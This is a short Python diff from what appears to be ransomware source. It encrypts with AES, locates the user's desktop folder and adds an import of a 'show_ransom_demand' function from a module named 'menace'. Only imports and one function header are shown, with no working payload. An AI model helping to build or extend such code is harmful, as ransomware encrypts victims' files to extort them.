@@ -3,6 +3,7 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
 from generate_key import generate_key
+from menace import show_ransom_demand
 
 def get_desktop_folder():
     """Détermine le chemin du bureau en fonction du système d'exploitation."""
